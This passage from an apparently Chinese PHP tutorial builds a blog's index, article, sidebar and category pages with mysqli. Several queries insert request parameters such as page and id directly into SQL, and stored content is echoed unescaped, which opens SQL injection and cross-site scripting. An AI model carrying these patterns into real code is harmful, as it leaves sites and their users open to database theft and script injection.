aria-expanded="false" aria-label="Toggle navigation"&gt;                &lt;div class="lyear-hamburger"&gt;                    &lt;div class="hamburger-inner"&gt;&lt;/div&gt;                &lt;/div&gt;            &lt;/a&gt;            &lt;div id="navigation" class="collapse navbar-collapse flex-column"&gt;                &lt;div class="profile-section pt-3 pt-lg-0"&gt;                    &lt;img class="profile-image mb-3 rounded-circle mx-auto" src="images/logo.png" width="120" height="120" alt="笔下光年" &gt;                    &lt;div class="lyear-sentence mb-3"&gt;必须记住我们学习的时间是有限的。时间有限，不只由于人生短促，更由于人事纷繁。我们就应力求把我们所有的时间用去做最有益的事情。&lt;/div&gt;                    &lt;hr&gt;                &lt;/div&gt;                &lt;ul class="navbar-nav flex-column text-center"&gt;                    &lt;li class="nav-item active"&gt;                        &lt;?php                        $result = $conn-&gt;query("select * from cate");                        while ($row=$result-&gt;fetch_assoc())                        {                        ?&gt;                        &lt;a class="nav-link" href="post.php?id=&lt;?php echo $row['id']; ?&gt;"&gt;&lt;?php echo $row['class_name']; ?&gt;&lt;/a&gt;                    &lt;/li&gt;                    &lt;?php                    }                    ?&gt;                    &lt;li class="nav-item"&gt;                        &lt;a class="nav-link" href="about.html"&gt;关于我&lt;/a&gt;                    &lt;/li&gt;                &lt;/ul&gt;                &lt;div class="my-2 my-md-3"&gt;                    &lt;form class="lyear-search-form form-inline justify-content-center pt-3"&gt;                        &lt;input type="email" id="semail" name="semail1" class="form-control mr-md-1" placeholder="搜索关键词" /&gt;                    &lt;/form&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/nav&gt;    &lt;/div&gt;&lt;/header&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'configs/config.php';include_once 'header.php';$result = $conn-&gt;query('select * from config');while($row=$result-&gt;fetch_assoc()){    $web[$row['name']]=$row['value'];}?&gt;&lt;div class="lyear-wrapper"&gt;  &lt;section class="mt-5 pb-5"&gt;    &lt;div class="container"&gt;      &lt;div class="row"&gt;        &lt;!-- 文章列表 --&gt;        &lt;div class="col-xl-8"&gt;          &lt;article class="lyear-arc"&gt;            &lt;div class="arc-header"&gt;              &lt;h2 class="arc-title"&gt;&lt;a href="post.html"&gt;蔚来汽车宣布将在今日20点召开第二季度财报业绩电话会&lt;/a&gt;&lt;/h2&gt;              &lt;ul class="arc-meta"&gt;                &lt;li&gt;&lt;i class="mdi mdi-calendar"&gt;&lt;/i&gt; 2019-09-25 09:21&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-tag-text-outline"&gt;&lt;/i&gt; &lt;a href="#"&gt;蔚来汽车&lt;/a&gt;, &lt;a href="#"&gt;财报&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-comment-multiple-outline"&gt;&lt;/i&gt; &lt;a href="#"&gt;3 评论&lt;/a&gt;&lt;/li&gt;              &lt;/ul&gt;            &lt;/div&gt;            &lt;div class="arc-synopsis"&gt;              &lt;p&gt;今日，蔚来宣布将在北京时间周三20: 00召开第二季度财报业绩电话会议。昨日，蔚来汽车公布了截至 2019 年 6 月 30 日未经审计的第二季度财报。财报财报显示，蔚来 2019 第二季度获得总营收15. 086 亿元，环比下降7.5%同比增长3180.1%;净亏损32. 858 亿元，环比增长25.2%，同比增长83.1%。&lt;/p&gt;            &lt;/div&gt;          &lt;/article&gt;          &lt;article class="lyear-arc"&gt;            &lt;div class="arc-header"&gt;              &lt;h2 class="arc-title"&gt;&lt;a href="post.html"&gt;苹果 CEO 库克：Apple 已完全使用可再生能源供电&lt;/a&gt;&lt;/h2&gt;              &lt;ul class="arc-meta"&gt;                &lt;li&gt;&lt;i class="mdi mdi-calendar"&gt;&lt;/i&gt; 2019-09-25 09:20&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-tag-text-outline"&gt;&lt;/i&gt; &lt;a href="#"&gt;苹果&lt;/a&gt;, &lt;a href="#"&gt;Apple&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-comment-multiple-outline"&gt;&lt;/i&gt; &lt;a href="#"&gt;37 评论&lt;/a&gt;&lt;/li&gt;              &lt;/ul&gt;            &lt;/div&gt;            &lt;div class="arc-preview"&gt;              &lt;a href="#"&gt;&lt;img src="images/blog/post-1.png" alt="" class="img-fluid rounded"&gt;&lt;/a&gt;            &lt;/div&gt;            &lt;div class="arc-synopsis"&gt;              &lt;p&gt;苹果 CEO 库克在微博上表示，「我们很自豪 Apple 已完全使用可再生能源供电，并携手我们的供应商共同朝这个方向努力。明年我们将有超过 6000 兆瓦的新可再生能源并网，包括位于湖南和湖北的三座新风电场。」&lt;/p&gt;            &lt;/div&gt;          &lt;/article&gt;          &lt;article class="lyear-arc"&gt;            &lt;div class="arc-header"&gt;              &lt;h2 class="arc-title"&gt;&lt;a href="post.html"&gt;韭菜扎心！比特币一度跌破8000美元  24小时跌幅10.6%&lt;/a&gt;&lt;/h2&gt;              &lt;ul class="arc-meta"&gt;                &lt;li&gt;&lt;i class="mdi mdi-calendar"&gt;&lt;/i&gt; 2019-09-25 09:19&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-tag-text-outline"&gt;&lt;/i&gt; &lt;a href="#"&gt;比特币&lt;/a&gt;, &lt;a href="#"&gt;韭菜&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-comment-multiple-outline"&gt;&lt;/i&gt; &lt;a href="#"&gt;90 评论&lt;/a&gt;&lt;/li&gt;              &lt;/ul&gt;            &lt;/div&gt;            &lt;div class="arc-synopsis"&gt;              &lt;p&gt;本周二，比特币迎来了一轮暴跌，根据行情显示，比特币今日凌晨曾一度跌破 8000 美元，现报约8723美元，恐怕这让一大波韭菜们相当扎心。 &lt;/p&gt;            &lt;/div&gt;          &lt;/article&gt;          &lt;article class="lyear-arc"&gt;            &lt;div class="arc-header"&gt;              &lt;h2 class="arc-title"&gt;&lt;a href="post.html"&gt;数十万 PhpStudy 用户被植入后门，快来检测你是否已沦为“肉鸡”！&lt;/a&gt;&lt;/h2&gt;              &lt;ul class="arc-meta"&gt;                &lt;li&gt;&lt;i class="mdi mdi-calendar"&gt;&lt;/i&gt; 2019-09-24 09:57&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-tag-text-outline"&gt;&lt;/i&gt; &lt;a href="#"&gt;PhpStudy&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-comment-multiple-outline"&gt;&lt;/i&gt; &lt;a href="#"&gt;115 评论&lt;/a&gt;&lt;/li&gt;              &lt;/ul&gt;            &lt;/div&gt;            &lt;div class="arc-preview"&gt;              &lt;a href="#"&gt;&lt;img src="images/blog/post-2.jpg" alt="" class="img-fluid rounded"&gt;&lt;/a&gt;            &lt;/div&gt;            &lt;div class="arc-synopsis"&gt;              &lt;p&gt;北京时间9月20日，杭州公安发布《杭州警方通报打击涉网违法犯罪暨‘净网2019’专项行动战果》一文，文章曝光了国内知名PHP调试环境程序集成包“PhpStudy软件”遭到黑客篡改并植入“后门”。截...&lt;/p&gt;            &lt;/div&gt;          &lt;/article&gt;          &lt;article class="lyear-arc"&gt;            &lt;div class="arc-header"&gt;              &lt;h2 class="arc-title"&gt;&lt;a href="post.html"&gt;效力微软 15 年的前员工解释 Windows 10 为什么问题如此多&lt;/a&gt;&lt;/h2&gt;              &lt;ul class="arc-meta"&gt;                &lt;li&gt;&lt;i class="mdi mdi-calendar"&gt;&lt;/i&gt; 2019-09-24 07:52&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-tag-text-outline"&gt;&lt;/i&gt; &lt;a href="#"&gt;windows&lt;/a&gt;, &lt;a href="#"&gt;win10&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-comment-multiple-outline"&gt;&lt;/i&gt; &lt;a href="#"&gt;26 评论&lt;/a&gt;&lt;/li&gt;              &lt;/ul&gt;            &lt;/div&gt;            &lt;div class="arc-synopsis"&gt;              &lt;p&gt;众所周知 Windows 10 系统问题频发，整体来说稳定性比较差，然而在此之前的版本其实相对来说稳定性还挺好的。自从 Windows 10 正式版推出之时，该系统就开始频繁出现问题，乃至现在每个月安全...&lt;/p&gt;            &lt;/div&gt;          &lt;/article&gt;          &lt;!-- 分页 --&gt;          &lt;div class="row"&gt;            &lt;div class="col-lg-12"&gt;              &lt;ul class="pagination"&gt;                &lt;li class="page-item"&gt;&lt;a class="page-link" href="#"&gt;&lt;i class="mdi mdi-chevron-left"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;                &lt;li class="page-item active"&gt;&lt;a class="page-link" href="#"&gt;1&lt;/a&gt;&lt;/li&gt;                &lt;li class="page-item"&gt;&lt;a class="page-link" href="#"&gt;2&lt;/a&gt;&lt;/li&gt;                &lt;li class="page-item"&gt;&lt;a class="page-link" href="#"&gt;3&lt;/a&gt;&lt;/li&gt;                &lt;li class="page-item"&gt;&lt;a class="page-link" href="#"&gt;4&lt;/a&gt;&lt;/li&gt;                &lt;li class="page-item"&gt;&lt;a class="page-link" href="#"&gt;5&lt;/a&gt;&lt;/li&gt;                &lt;li class="page-item"&gt;&lt;a class="page-link" href="#"&gt;&lt;i class="mdi mdi-chevron-right"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;              &lt;/ul&gt;            &lt;/div&gt;          &lt;/div&gt;          &lt;!-- 分页 end --&gt;        &lt;/div&gt;        &lt;!-- 内容 end --&gt;        &lt;!-- 侧边栏 --&gt;        &lt;div class="col-xl-4"&gt;          &lt;div class="lyear-sidebar"&gt;            &lt;!-- 热门文章 --&gt;            &lt;aside class="widget widget-hot-posts"&gt;              &lt;div class="widget-title"&gt;热门文章&lt;/div&gt;              &lt;ul&gt;                &lt;li&gt;                  &lt;a href="#"&gt;三星将为 Galaxy Fold 用户提供 149 美元更换屏幕服务&lt;/a&gt; &lt;span&gt;2019-09-25 10:05&lt;/span&gt;                &lt;/li&gt;                &lt;li&gt;                  &lt;a href="#"&gt;专家：10年后6G将问世 数据传输速率有望比5G快100倍&lt;/a&gt; &lt;span&gt;2019-09-25 08:06&lt;/span&gt;                &lt;/li&gt;                &lt;li&gt;                  &lt;a href="#"&gt;苹果正式发布 iPadOS 13.1 系统，加入多项强大新功能&lt;/a&gt; &lt;span&gt;2019-09-25 09:35&lt;/span&gt;                &lt;/li&gt;              &lt;/ul&gt;            &lt;/aside&gt;            &lt;!-- 归档 --&gt;            &lt;aside class="widget"&gt;              &lt;div class="widget-title"&gt;归档&lt;/div&gt;              &lt;ul&gt;                &lt;li&gt;&lt;a href="#"&gt;2019 三月&lt;/a&gt; (40)&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;2019 四月&lt;/a&gt; (08)&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;2019 五月&lt;/a&gt; (11)&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;2019 六月&lt;/a&gt; (21)&lt;/li&gt;              &lt;/ul&gt;            &lt;/aside&gt;            &lt;!-- 标签 --&gt;            &lt;aside class="widget widget-tag-cloud"&gt;              &lt;div class="widget-title"&gt;标签&lt;/div&gt;              &lt;div class="tag-cloud"&gt;                &lt;a href="#" class="badge badge-light"&gt;php&lt;/a&gt;                &lt;a href="#" class="badge badge-primary"&gt;苹果&lt;/a&gt;                &lt;a href="#" class="badge badge-danger"&gt;比特币&lt;/a&gt;                &lt;a href="#" class="badge badge-light"&gt;linux&lt;/a&gt;                &lt;a href="#" class="badge badge-light"&gt;前端&lt;/a&gt;                &lt;a href="#" class="badge badge-light"&gt;vue&lt;/a&gt;              &lt;/div&gt;            &lt;/aside&gt;          &lt;/div&gt;        &lt;/div&gt;        &lt;!-- 侧边栏 end --&gt;      &lt;/div&gt;    &lt;/div&gt;    &lt;!-- end container --&gt;  &lt;/section&gt;&lt;/div&gt;&lt;script type="text/javascript" src="js/jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/jquery.nicescroll.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/bootstrap.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/main.min.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210715122249326.png" alt="image-20210715122249326"></p><h2 id="首页文章列表功能的实现"><a href="#首页文章列表功能的实现" class="headerlink" title="首页文章列表功能的实现"></a>首页文章列表功能的实现</h2><p>我们还是通过数据库查询的方式，将查询的内容输出到index页面</p><p>index.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'configs/config.php';include_once 'header.php';$result = $conn-&gt;query('select * from config');while($row=$result-&gt;fetch_assoc()){    $web[$row['name']]=$row['value'];}?&gt;&lt;div class="lyear-wrapper"&gt;  &lt;section class="mt-5 pb-5"&gt;    &lt;div class="container"&gt;      &lt;div class="row"&gt;        &lt;!-- 文章列表 --&gt;        &lt;div class="col-xl-8"&gt;            &lt;?php            include_once 'common/Page.class.php';            $page = isset($_GET['page'])?$_GET['page']:1;            $subPages=4;            $result=$conn-&gt;query("select a.id,a.title,a.n,a.author,b.class_name,a.c_time,a.keyword,a.content from article as a,cate as b where a.cateid=b.id order by a.id desc limit $page,$subPages");            while ($row=$result-&gt;fetch_assoc())            {            ?&gt;            &lt;article class="lyear-arc"&gt;            &lt;div class="arc-header"&gt;              &lt;h2 class="arc-title"&gt;&lt;a href="post.php?id=&lt;?php echo $row['id']; ?&gt;"&gt;&lt;?php echo $row['title']; ?&gt;&lt;/a&gt;&lt;/h2&gt;              &lt;ul class="arc-meta"&gt;                &lt;li&gt;&lt;i class="mdi mdi-calendar"&gt;&lt;/i&gt; &lt;?php echo date("Y-m-d H:i:s",$row['c_time'])?&gt;&lt;/li&gt;                  &lt;li&gt;&lt;i class="mdi mdi-tag-text-outline"&gt;&lt;/i&gt; &lt;?php echo $row['class_name']; ?&gt;&lt;/li&gt;                &lt;li&gt;&lt;i class="mdi mdi-tag-text-outline"&gt;&lt;/i&gt; &lt;?php echo $row['keyword']; ?&gt;&lt;/li&gt;              &lt;/ul&gt;            &lt;/div&gt;            &lt;div class="arc-synopsis"&gt;              &lt;p&gt;&lt;?php echo $row['content']; ?&gt;&lt;/p&gt;            &lt;/div&gt;          &lt;/article&gt;            &lt;?php            }            ?&gt;          &lt;!-- 分页 --&gt;          &lt;div class="row"&gt;            &lt;div class="col-lg-12"&gt;                &lt;?php                $result_2=$conn-&gt;query("select * from article  as a,cate as b where a.cateid=b.id order by a.id desc ");                $result_count=$result_2-&gt;num_rows;                $p= new Page($result_count,4,$page,$subPages);                echo $p-&gt;showPages(1);                ?&gt;            &lt;/div&gt;          &lt;/div&gt;          &lt;!-- 分页 end --&gt;        &lt;/div&gt;        &lt;!-- 内容 end --&gt;        &lt;!-- 侧边栏 --&gt;        &lt;div class="col-xl-4"&gt;          &lt;div class="lyear-sidebar"&gt;            &lt;!-- 热门文章 --&gt;            &lt;aside class="widget widget-hot-posts"&gt;              &lt;div class="widget-title"&gt;热门文章&lt;/div&gt;              &lt;ul&gt;                &lt;li&gt;                  &lt;a href="#"&gt;三星将为 Galaxy Fold 用户提供 149 美元更换屏幕服务&lt;/a&gt; &lt;span&gt;2019-09-25 10:05&lt;/span&gt;                &lt;/li&gt;                &lt;li&gt;                  &lt;a href="#"&gt;专家：10年后6G将问世 数据传输速率有望比5G快100倍&lt;/a&gt; &lt;span&gt;2019-09-25 08:06&lt;/span&gt;                &lt;/li&gt;                &lt;li&gt;                  &lt;a href="#"&gt;苹果正式发布 iPadOS 13.1 系统，加入多项强大新功能&lt;/a&gt; &lt;span&gt;2019-09-25 09:35&lt;/span&gt;                &lt;/li&gt;              &lt;/ul&gt;            &lt;/aside&gt;            &lt;!-- 归档 --&gt;            &lt;aside class="widget"&gt;              &lt;div class="widget-title"&gt;归档&lt;/div&gt;              &lt;ul&gt;                &lt;li&gt;&lt;a href="#"&gt;2019 三月&lt;/a&gt; (40)&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;2019 四月&lt;/a&gt; (08)&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;2019 五月&lt;/a&gt; (11)&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;2019 六月&lt;/a&gt; (21)&lt;/li&gt;              &lt;/ul&gt;            &lt;/aside&gt;            &lt;!-- 标签 --&gt;            &lt;aside class="widget widget-tag-cloud"&gt;              &lt;div class="widget-title"&gt;标签&lt;/div&gt;              &lt;div class="tag-cloud"&gt;                &lt;a href="#" class="badge badge-light"&gt;php&lt;/a&gt;                &lt;a href="#" class="badge badge-primary"&gt;苹果&lt;/a&gt;                &lt;a href="#" class="badge badge-danger"&gt;比特币&lt;/a&gt;                &lt;a href="#" class="badge badge-light"&gt;linux&lt;/a&gt;                &lt;a href="#" class="badge badge-light"&gt;前端&lt;/a&gt;                &lt;a href="#" class="badge badge-light"&gt;vue&lt;/a&gt;              &lt;/div&gt;            &lt;/aside&gt;          &lt;/div&gt;        &lt;/div&gt;        &lt;!-- 侧边栏 end --&gt;      &lt;/div&gt;    &lt;/div&gt;    &lt;!-- end container --&gt;  &lt;/section&gt;&lt;/div&gt;&lt;script type="text/javascript" src="js/jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/jquery.nicescroll.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/bootstrap.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/main.min.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210715131607401.png" alt="image-20210715131607401"></p><h2 id="详细文章页和侧边栏功能的编写"><a href="#详细文章页和侧边栏功能的编写" class="headerlink" title="详细文章页和侧边栏功能的编写"></a>详细文章页和侧边栏功能的编写</h2><p>我们来做一下点击文章进入整个文章的界面post.php</p><p>post.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';$id=filterstr($_GET['id']);$result=$conn-&gt;query("select * from article where id='$id'");$row =$result-&gt;fetch_assoc();$conn-&gt;query("update article set n=n+1 where id='$id'");?&gt;&lt;div class="lyear-wrapper"&gt;    &lt;section class="mt-5 pb-5"&gt;        &lt;div class="container"&gt;            &lt;div class="row"&gt;                &lt;!-- 文章阅读 --&gt;                &lt;div class="col-xl-8"&gt;                    &lt;article class="lyear-arc"&gt;                        &lt;div class="arc-header"&gt;                            &lt;h2 class="arc-title"&gt;&lt;?php echo $row['title'];?&gt;&lt;/a&gt;&lt;/h2&gt;                            &lt;ul class="arc-meta"&gt;                                &lt;li&gt;&lt;i class="mdi mdi-calendar"&gt;&lt;/i&gt; &lt;?php echo date("Y-m-d H:i:s",$row['c_time']);?&gt;&lt;/li&gt;                                &lt;li&gt;&lt;i class="mdi mdi-tag-text-outline"&gt;&lt;/i&gt; &lt;?php echo $row['keyword']?&gt;&lt;/li&gt;                                &lt;li&gt;&lt;i class="mdi mdi-tag-text-outline"&gt;&lt;/i&gt; 已阅 &lt;?php echo $row['n']?&gt;  &lt;/li&gt;                            &lt;/ul&gt;                        &lt;/div&gt;                        &lt;div class="lyear-arc-detail"&gt;                            &lt;p&gt;&lt;?php echo $row['content'];?&gt;&lt;/p&gt;                        &lt;/div&gt;                    &lt;/article&gt;                &lt;/div&gt;                &lt;!-- 内容 end --&gt;                &lt;!-- 侧边栏 --&gt;                &lt;?php                include_once 'right.php';                ?&gt;                &lt;!-- 侧边栏 end --&gt;            &lt;/div&gt;        &lt;/div&gt;        &lt;!-- end container --&gt;    &lt;/section&gt;&lt;/div&gt;&lt;script type="text/javascript" src="js/jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/jquery.nicescroll.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/bootstrap.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/highlight/highlight.pack.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/main.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;hljs.initHighlightingOnLoad();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210715142421884.png" alt="image-20210715142421884"></p><p>页面点击文章时，左右时不变的，所以我们像引入heade一样把右边栏放到right里引入即可</p><p>right我们分为热门网站和友链俩部分,热门文章通过访问一篇文章时，让他的访问量n值自增，来进行排序</p><p>right.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php?&gt;&lt;div class="col-xl-4"&gt;    &lt;div class="lyear-sidebar"&gt;        &lt;!-- 热门文章 --&gt;        &lt;aside class="widget widget-hot-posts"&gt;            &lt;div class="widget-title"&gt;热门文章&lt;/div&gt;            &lt;ul&gt;                &lt;?php                $result= $conn-&gt;query("select * from article order by n desc limit 5");                while($row=$result-&gt;fetch_assoc())                {                    ?&gt;                    &lt;li&gt;                        &lt;a href="post.php?id=&lt;?php echo $row['id']?&gt;"&gt;&lt;?php echo $row['title']?&gt;&lt;/a&gt; &lt;span&gt;&lt;?php echo date("Y-m-d H:i:s",$row['c_time']);?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;?php                }                ?&gt;            &lt;/ul&gt;        &lt;/aside&gt;        &lt;!-- 友链--&gt;        &lt;aside class="widget"&gt;            &lt;div class="widget-title"&gt;友链&lt;/div&gt;            &lt;ul&gt;                &lt;?php                $result= $conn-&gt;query("select * from flink");                while($row=$result-&gt;fetch_assoc()){                    ?&gt;                    &lt;li&gt;&lt;a href="&lt;?php echo $row['url'];?&gt;"&gt;&lt;?php echo $row['url_name']?&gt;&lt;/a&gt;&lt;/li&gt;                &lt;?php }?&gt;            &lt;/ul&gt;        &lt;/aside&gt;    &lt;/div&gt;&lt;/div&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="左边分类列表功能编写"><a href="#左边分类列表功能编写" class="headerlink" title="左边分类列表功能编写"></a>左边分类列表功能编写</h2><p>他点击之后跟主页大同小异，我们拿过来稍作修改</p><p>我们需要修改sql语句，把分类的id拿过来</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">filterstr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再查询语句上添加即可</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a<span class="token punctuation">.</span>id<span class="token punctuation">,</span>a<span class="token punctuation">.</span>title<span class="token punctuation">,</span>a<span class="token punctuation">.</span>n<span class="token punctuation">,</span>a<span class="token punctuation">.</span>author<span class="token punctuation">,</span>b<span class="token punctuation">.</span>class_name<span class="token punctuation">,</span>a<span class="token punctuation">.</span>c_time<span class="token punctuation">,</span>a<span class="token punctuation">.</span>content<span class="token punctuation">,</span>a<span class="token punctuation">.</span>keyword <span class="token keyword">from</span> article <span class="token keyword">as</span> a<span class="token punctuation">,</span>cate <span class="token keyword">as</span> b <span class="token keyword">where</span> a<span class="token punctuation">.</span>cateid<span class="token operator">=</span>b<span class="token punctuation">.</span>id <span class="token operator">and</span> b<span class="token punctuation">.</span>id<span class="token operator">=</span>$id <span class="token keyword">order</span> <span class="token keyword">by</span> a<span class="token punctuation">.</span>id <span class="token keyword">desc</span> <span class="token keyword">limit</span> $<span class="token keyword">start</span><span class="token punctuation">,</span>$subPages<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>list.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';?&gt;&lt;div class="lyear-wrapper"&gt;    &lt;section class="mt-5 pb-5"&gt;        &lt;div class="container"&gt;            &lt;div class="row"&gt;                &lt;!-- 文章列表 --&gt;                &lt;div class="col-xl-8"&gt;                    &lt;?php                    include_once 'common/Page.class.php';                    $page=isset($_GET['page'])? $_GET['page']:1;                    $id=filterstr($_GET['id']);                    $subPages=5;                    $start=($page-1)*$subPages;//0*5 1*5 2*5 每页5篇文章                    $result=$conn-&gt;query("select a.id,a.title,a.n,a.author,b.class_name,a.c_time,a.content,a.keyword from article as a,cate as b where a.cateid=b.id and b.id=$id order by a.id desc limit $start,$subPages");                    while($row=$result-&gt;fetch_assoc()){                        ?&gt;                        &lt;article class="lyear-arc"&gt;                            &lt;div class="arc-header"&gt;                                &lt;h2 class="arc-title"&gt;&lt;a href="post.php?id=&lt;?php echo $row['id']?&gt;"&gt;&lt;?php echo $row['title']?&gt;&lt;/a&gt;&lt;/h2&gt;                                &lt;ul class="arc-meta"&gt;                                    &lt;li&gt;&lt;i class="mdi mdi-calendar"&gt;&lt;/i&gt; &lt;?php echo date("Y-m-d H:i:s",$row['c_time']);?&gt;&lt;/li&gt;                                    &lt;li&gt;&lt;i class="mdi mdi-calendar"&gt;&lt;/i&gt;&lt;?php echo $row['class_name'];?&gt;&lt;/li&gt;                                    &lt;li&gt;&lt;i class="mdi mdi-tag-text-outline"&gt;&lt;/i&gt;&lt;?php echo $row['keyword'];?&gt;&lt;/li&gt;                                &lt;/ul&gt;                            &lt;/div&gt;                            &lt;div class="arc-synopsis"&gt;                                &lt;?php echo $row['content'];?&gt;                            &lt;/div&gt;                        &lt;/article&gt;                    &lt;?php  }?&gt;                    &lt;!-- 分页 --&gt;                    &lt;div class="row"&gt;                        &lt;div class="col-lg-12"&gt;                            &lt;?php                            $result_2=$conn-&gt;query("select 